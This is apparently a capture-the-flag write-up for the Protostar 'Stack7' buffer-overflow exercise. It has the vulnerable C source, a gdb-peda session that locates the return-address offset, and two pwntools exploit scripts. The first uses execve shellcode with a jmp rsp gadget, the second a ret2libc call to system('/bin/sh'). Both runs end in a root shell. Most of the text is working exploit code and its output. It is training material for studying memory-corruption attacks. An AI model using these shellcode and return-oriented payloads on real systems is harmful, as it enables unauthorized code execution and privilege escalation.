### Stack7

* Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
    char buffer[64];
    unsigned int ret;

    printf("input path please: "); fflush(stdout);

    gets(buffer);

    ret = __builtin_return_address(0);

    if((ret & 0xb0000000) == 0xb0000000) {
        printf("bzzzt (%p)\n", ret);
        _exit(1);
    }

    printf("got path %s\n", buffer);
    return strdup(buffer);
}

int main(int argc, char **argv)
{
    getpath();
}
```

* Solution

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000004011f7 <+0>:	push   rbp
   0x00000000004011f8 <+1>:	mov    rbp,rsp
   0x00000000004011fb <+4>:	sub    rsp,0x10
   0x00000000004011ff <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401202 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401206 <+15>:	mov    eax,0x0
   0x000000000040120b <+20>:	call   0x401162 <getpath>
   0x0000000000401210 <+25>:	mov    eax,0x0
   0x0000000000401215 <+30>:	leave  
   0x0000000000401216 <+31>:	ret    
End of assembler dump.
gdb-peda$ b *main+31
Breakpoint 1 at 0x401216
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /root/Desktop/stack7 
input path please: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
got path AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAAKAAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x405a80 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAAKAAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x405a80 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAAKAAJAAfAA5AAKAAgAA6AAL")
RDX: 0x65 ('e')
RSI: 0x7fffffffe140 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAAKAAJAAfAA5AAKAAgAA6AAL")
RDI: 0x405a80 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAAKAAJAAfAA5AAKAAgAA6AAL")
RBP: 0x3541416641414a41 ('AJAAfAA5')
RSP: 0x7fffffffe198 ("AAKAAgAA6AAL")
RIP: 0x4011f6 (<getpath+148>:	ret)
R8 : 0x3 
R9 : 0x7fffffffe140 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAAKAAJAAfAA5AAKAAgAA6AAL")
R10: 0x0 
R11: 0x0 
R12: 0x401080 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe290 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011ed <getpath+139>:	mov    rdi,rax
   0x4011f0 <getpath+142>:	call   0x401070 <strdup@plt>
   0x4011f5 <getpath+147>:	leave  
=> 0x4011f6 <getpath+148>:	ret    
   0x4011f7 <main>:	push   rbp
   0x4011f8 <main+1>:	mov    rbp,rsp
   0x4011fb <main+4>:	sub    rsp,0x10
   0x4011ff <main+8>:	mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe198 ("AAKAAgAA6AAL")
0008| 0x7fffffffe1a0 --> 0x7f004c414136 
0016| 0x7fffffffe1a8 --> 0x100000000 
0024| 0x7fffffffe1b0 --> 0x401220 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe1b8 --> 0x7ffff7e11b17 (<__libc_start_main+231>:	mov    edi,eax)
0040| 0x7fffffffe1c0 --> 0x0 
0048| 0x7fffffffe1c8 --> 0x7fffffffe298 --> 0x7fffffffe579 ("/root/Desktop/stack7")
0056| 0x7fffffffe1d0 --> 0x100040000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011f6 in getpath ()
gdb-peda$ pattern offset AAKAAgAA6AAL
AAKAAgAA6AAL found at offset: 88
gdb-peda$ jmpcall
0x401010 : call rax
0x4010dc : jmp rax
0x40111e : jmp rax
0x402063 : jmp rsp
0x402123 : jmp [rax]
0x403063 : jmp rsp
0x403123 : jmp [rax]
gdb-peda$ quit

root@kali:~/Desktop# cat stack7_ex.py 
from pwn import *

buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

jmp_rsp    = p64(0x402063)
offset = 88

payload = "A" * offset + jmp_rsp + buf

p = process(['stack7'])

p.sendline(payload)

p.interactive()
root@kali:~/Desktop# python stack7_ex.py 
[!] Could not find executable 'stack7' in $PATH, using './stack7' instead
[+] Starting local process './stack7': pid 4170
[*] Switching to interactive mode
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc @
$ whoami
root
$  
```

* Solution2

```
from pwn import *

system     = p32(0xf7e0f7e0)
dummy      = p32(0xFFFFFFFF)
binsh_addr = p32(0xf7f4e968)
rop_gadget = p32(0x8048362)
offset     = 80

payload = "A" * offset + rop_gadget + system + dummy + binsh_addr

p = process(['./stack7'])

p.sendline(payload)

p.interactive()
root@kali:~/Desktop/bin# python stack7_ex2.py 
[+] Starting local process './stack7': pid 4594
[*] Switching to interactive mode
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb\x83\x0AAAAAAAAAAAAb\x83\x0�������\xffh���
$ whoami
root
$  
```
